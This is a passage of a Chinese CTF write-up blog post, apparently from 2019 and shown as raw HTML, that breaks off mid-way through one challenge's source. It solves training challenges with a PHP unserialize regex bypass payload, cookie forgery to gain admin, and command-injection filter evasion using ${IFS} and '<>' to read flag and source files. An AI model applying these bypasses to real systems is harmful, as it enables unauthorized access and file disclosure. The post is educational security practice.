<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="2019-CTF-Writeup合集"><meta name="keywords" content="CTF,Writeup,Web"><meta name="author" content="Gard3nia"><meta name="copyright" content="Gard3nia"><title>2019-CTF-Writeup合集 | Gard3nia's Notebook</title><link rel="shortcut icon" href="/rea.jpg"><link rel="stylesheet" href="/css/index.css?version=1.5.6"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.5.6"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#正文"><span class="toc-number">1.</span> <span class="toc-text">正文</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2018安恒杯12月月赛复现"><span class="toc-number">2.</span> <span class="toc-text">2018安恒杯12月月赛复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easy"><span class="toc-number">2.1.1.</span> <span class="toc-text">easy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyweb2"><span class="toc-number">2.1.2.</span> <span class="toc-text">easyweb2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">2.2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#juju"><span class="toc-number">2.2.1.</span> <span class="toc-text">juju</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2019安恒杯1月月赛复现"><span class="toc-number">3.</span> <span class="toc-text">2019安恒杯1月月赛复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-1"><span class="toc-number">3.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#babyGo"><span class="toc-number">3.1.1.</span> <span class="toc-text">babyGo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">3.2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#键盘之争"><span class="toc-number">3.2.1.</span> <span class="toc-text">键盘之争</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#杭电Hgame-2019-week1-WP"><span class="toc-number">4.</span> <span class="toc-text">杭电Hgame-2019-week1-WP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-2"><span class="toc-number">4.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#谁吃了我的flag"><span class="toc-number">4.1.1.</span> <span class="toc-text">谁吃了我的flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#换头大作战"><span class="toc-number">4.1.2.</span> <span class="toc-text">换头大作战</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#very-easy-web"><span class="toc-number">4.1.3.</span> <span class="toc-text">very easy web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#can-u-find-me"><span class="toc-number">4.1.4.</span> <span class="toc-text">can u find me?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-1"><span class="toc-number">4.2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mix"><span class="toc-number">4.2.1.</span> <span class="toc-text">Mix</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base全家"><span class="toc-number">4.2.2.</span> <span class="toc-text">base全家</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#杭电Hgame-2019-week2-WP"><span class="toc-number">5.</span> <span class="toc-text">杭电Hgame-2019-week2-WP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-3"><span class="toc-number">5.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-php"><span class="toc-number">5.1.1.</span> <span class="toc-text">easy_php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phptrick"><span class="toc-number">5.1.2.</span> <span class="toc-text">phptrick</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-is-the-best-language"><span class="toc-number">5.1.3.</span> <span class="toc-text">php is the best language</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BabySpider"><span class="toc-number">5.1.4.</span> <span class="toc-text">BabySpider</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-10关"><span class="toc-number">5.1.4.1.</span> <span class="toc-text">1-10关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11-20关"><span class="toc-number">5.1.4.2.</span> <span class="toc-text">11-20关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#21-30关"><span class="toc-number">5.1.4.3.</span> <span class="toc-text">21-30关</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Math有趣"><span class="toc-number">5.1.5.</span> <span class="toc-text">Math有趣</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-2"><span class="toc-number">5.2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#浪漫足球圣地"><span class="toc-number">5.2.1.</span> <span class="toc-text">浪漫足球圣地</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hill"><span class="toc-number">5.2.2.</span> <span class="toc-text">hill</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vigener"><span class="toc-number">5.2.3.</span> <span class="toc-text">Vigener~</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Hgame-2019几道有趣的RSA"><span class="toc-number">6.</span> <span class="toc-text">Hgame-2019几道有趣的RSA</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#babyRSA"><span class="toc-number">6.1.</span> <span class="toc-text">babyRSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-rsa"><span class="toc-number">6.2.</span> <span class="toc-text">easy_rsa</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2019西湖论剑初赛复现"><span class="toc-number">7.</span> <span class="toc-text">2019西湖论剑初赛复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-4"><span class="toc-number">7.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#babyt3"><span class="toc-number">7.1.1.</span> <span class="toc-text">babyt3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜猜flag是什么"><span class="toc-number">7.1.2.</span> <span class="toc-text">猜猜flag是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#breakout"><span class="toc-number">7.1.3.</span> <span class="toc-text">breakout</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#构造XSS"><span class="toc-number">7.1.3.1.</span> <span class="toc-text">构造XSS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-3"><span class="toc-number">7.2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#哈夫曼之谜"><span class="toc-number">7.2.1.</span> <span class="toc-text">哈夫曼之谜</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2019信息安全国赛部分WP"><span class="toc-number">8.</span> <span class="toc-text">2019信息安全国赛部分WP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-5"><span class="toc-number">8.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#justsoso"><span class="toc-number">8.1.1.</span> <span class="toc-text">justsoso</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bypass1"><span class="toc-number">8.1.1.1.</span> <span class="toc-text">bypass1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bypass2"><span class="toc-number">8.1.1.2.</span> <span class="toc-text">bypass2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bypass3"><span class="toc-number">8.1.1.3.</span> <span class="toc-text">bypass3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp："><span class="toc-number">8.1.1.4.</span> <span class="toc-text">exp：</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Gard3nia</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">23</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">11</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">friendlinks</div><a class="author-info-links__name text-center" href="https://skysec.top">一叶飘零学长</a><a class="author-info-links__name text-center" href="https://0verwatch.top/">0verwatch</a><a class="author-info-links__name text-center" href="http://chaosec.top/">瑞雪师傅</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://s2.ax1x.com/2019/05/26/VE5mHf.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Gard3nia's Notebook</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">时间轴</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">归档</a><a class="site-page" href="/about">简介</a></span></div><div id="post-info"><div id="post-title">2019-CTF-Writeup合集</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-01-19</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Writeup/">Writeup</a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">9.5k</span><span class="post-meta__separator">|</span><span>Reading time: 42 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>本文为大学的一些参加过的CTF比赛的wp集合，一篇篇太零散，让我产生了我自己写博客好像仅仅只写了wp的错觉，所以就将wp全部放到了一起，以后还是多写点技术总结性的文章…<a id="more"></a></p>
<h1 id="2018安恒杯12月月赛复现"><a href="#2018安恒杯12月月赛复现" class="headerlink" title="2018安恒杯12月月赛复现"></a>2018安恒杯12月月赛复现</h1><p>萌新因为种种原因没有做安恒12月的月赛题，正巧这几天发现复现，又学到了新知识！<!--more--></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h3><p>题目<code>index.php</code>给出源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">    preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span><br><span class="line">    <span class="keyword">if</span>(count($matches))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Hacker!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        <span class="keyword">echo</span> $good;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这题一开始没看懂到底是啥意思，一开始定义了一个baby类，然后在下面完全没有用到有关这个类的任何东西，所以身为萌新的我一脸蒙圈……后来经过仔细地阅读代码，大量的查阅资料，现了其中的猫腻……</p>
<p><strong>分析：</strong></p>
<ol>
<li><p>代码一开始包含文件<code>flag.php</code>；</p>
</li>
<li><p>然后定义了一个类，类成员变量<code>$file</code>,重写<code>__toString()</code>方法，这个方法就是将以<code>$filename</code>为文件名的文件输出；</p>
</li>
<li><p>接着对<code>data</code>进行正则匹配<code>preg_match(&#39;/[oc]:\d+:/i&#39;,$data,$matches)</code>，匹配结果放入<code>$matches</code>，匹配成功就<code>die(&#39;Hacker!&#39;)</code>，不成功就对输入的<code>$data</code>进行反序列化并输出；</p>
</li>
</ol>
<p><strong>解题方法：</strong></p>
<p>其实这个题理解了以后就不难了，目标是输出<code>flag.php</code>的内容，所以构造的<code>data</code>肯定也与包含的文件名相关；</p>
<p>先对<code>flag.php</code>进行序列化并输出，脚本如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a=<span class="keyword">new</span> baby();</span><br><span class="line">$a-&gt;file=<span class="string">'flag.php'</span>;</span><br><span class="line">$b=serialize($a);</span><br><span class="line"><span class="keyword">echo</span>($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong><em>测试结果输出：</em></strong><code>O:4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code>直接GET这个值会匹配正则表达式，所以就要想办法绕过；</p>
<p><strong>绕过方法</strong>：该函数设计的初衷是为了不让<code>Object</code>类型被反序列化，然而正则不够严谨，我们可以在对象长度前加一个<code>+</code>号，即<code>O:4 -&gt; O:+4</code>，即可绕过这层检测，从而使得我们可控的数据传入<code>unserialize</code>函数；</p>
<p>构造如下：<code>O:+4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p>
<p>将这个字符传入<code>unserialize</code>函数以后会直接反序列化出一个<code>baby</code>的对象<code>$good</code>，<code>$good-&gt;file</code>是<code>flag.php</code>，反序列化后会直接默认调用魔术方法<code>__toString()</code>输出文件内容；</p>
<p>所以归根结底还是一个正则绕过+反序列化的问题，将构造的<code>data</code>经过URL编码以后GET进去即可得到flag；(不知道为啥直接在浏览器里传参没用，所以就用bp构造GET了一下)</p>
<p><code>payload:?data=O%3A%2b4%3A%22baby%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</code></p>
<p><img src="https://s2.ax1x.com/2019/01/19/kCMhtS.png" alt="kCMhtS.png"></p>
<p>反序列化漏洞参考链接：</p>
<p><a href="https://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/167721.html</a></p>
<p><a href="https://xz.aliyun.com/t/3017" target="_blank" rel="noopener">https://xz.aliyun.com/t/3017</a></p>
<p><a href="https://paper.seebug.org/39/" target="_blank" rel="noopener">https://paper.seebug.org/39/</a></p>
<h3 id="easyweb2"><a href="#easyweb2" class="headerlink" title="easyweb2"></a>easyweb2</h3><p>这题拿到以后没有切入点…老办法…扫一波目录，发现<code>admin.php</code>和<code>config.php</code></p>
<p><img src="https://s2.ax1x.com/2019/01/19/kCJwDJ.png" alt="kCJwDJ.png"></p>
<p>进入<code>admin.php</code>发现<code>You are not admin…</code>，基本定下思路就是伪造管理员身份登录，查看请求头中的信息发现cookie的<code>user=dXNlcg%3D%3D</code>推测为base64编码，解码为<code>user</code></p>
<p><img src="https://s2.ax1x.com/2019/01/19/kCJIUI.png" alt="kCJIUI.png"></p>
<p>要求以管理员身份登录，于是伪造<code>user</code>为<code>admin</code>，base64编码一下修改cookie的值为<code>YWRtaW4=</code>；刷新网页后发现进入了如下界面；</p>
<p><img src="https://s2.ax1x.com/2019/01/19/kCYCGV.png" alt="kCYCGV.png"></p>
<p>输入<code>ls</code>发现回显；</p>
<p><img src="https://s2.ax1x.com/2019/01/19/kCYeaR.png" alt="kCYeaR.png"></p>
<p>输入<code>ls /</code>想查看根目录报错<code>error</code>，输入<code>cat admin.php</code>报错，设想是过滤了空格，Google了一下空格的绕过方式如下：<strong>IFS的默认值为：空白（包括：空格，tab, 和新行)</strong></p>
<p><img src="https://s2.ax1x.com/2019/01/19/kCtlYq.md.png" alt="kCtlYq.md.png"></p>
<p>用<code>${IFS}</code>尝试绕过，输入<code>ls${IFS}/</code>,发现回显中有flag信息：</p>
<p><img src="https://s2.ax1x.com/2019/01/19/kCto1f.png" alt="kCto1f.png"></p>
<p>直接<code>cat${IFS}/ffLAG_404</code>得到flag：</p>
<p><img src="https://s2.ax1x.com/2019/01/19/kCtbng.png" alt="kCtbng.png"></p>
<p>事后想查看admin.php和config.php的内容，发现<code>${IFS}</code>无效，于是尝试<code>&lt;&gt;</code>成功，直接<code>cat&lt;&gt;admin.php和config.php</code>即可；</p>
<p><strong>admin.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'admin'</span>])||$_SESSION[<span class="string">'admin'</span>]===<span class="keyword">false</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"You are not admin..."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'cmd'</span>]) &#123;</span><br><span class="line">	$cmd = waf_exec($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line">	$retval = <span class="keyword">array</span>();</span><br><span class="line">	exec($cmd, $retval, $status);</span><br><span class="line">	<span class="comment">// var_dump($retval);</span></span><br><span class="line">	<span class="keyword">if</span> ($status == <span class="number">0</span>) &#123;</span><br><span class="line">		$res = implode(<span class="string">"\n"</span>,$retval);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$res = <span class="string">'error'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$res = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'./templates/admin.html'</span>;</span><br></pre></td></tr></table></figure>
<p><strong>config.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_exec</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	$black_str = <span class="string">"/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\?|@|\+| )/i"</span>;</span><br><span class="line">		$str = preg_replace($black_str, <span class="string">""</span>,$str);</span><br><span class="line">		<span class="keyword">return</span> $str;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>发现确实用<code>waf_exec()</code>函数过滤了<code>空格，&gt;，{，}</code>等一系列符号，但是没有过滤<code>&lt; / $</code>，所以可以直接用<code>&lt;和$IFS</code>绕过即可；</p>
<p>参考链接：<a href="http://www.k0rz3n.com/2017/07/30/cookie/#%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8Ccookie-%E6%AC%BA%E9%AA%97" target="_blank" rel="noopener">cookie欺骗</a>，<a href="https://www.anquanke.com/post/id/84920" target="_blank" rel="noopener">命令执行的绕过技巧</a></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="juju"><a href="#juju" class="headerlink" title="juju"></a>juju</h3><p>拿到图片丢进16进制编辑器，查找flag无果，发现是png图片就查看一下文件头，发现貌似没什么问题，看到图片的高度和长度不一样，于是都改成04，图片的下一截显现出来：</p>
<p><img src="https://s2.ax1x.com/2019/01/19/kCN7P1.png" alt="kCN7P1.png"></p>
<p>得到的编码为base32，直接解码md5一下即可</p>
<p><img src="https://s2.ax1x.com/2019/01/19/kCNfrF.png" alt="kCNfrF.png"></p>
<h1 id="2019安恒杯1月月赛复现"><a href="#2019安恒杯1月月赛复现" class="headerlink" title="2019安恒杯1月月赛复现"></a>2019安恒杯1月月赛复现</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="babyGo"><a href="#babyGo" class="headerlink" title="babyGo"></a>babyGo</h3><p>考察的知识点：</p>
<ol>
<li>PHP反序列化；</li>
<li>POP链的构造；</li>
</ol>
<p>此题给出源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span 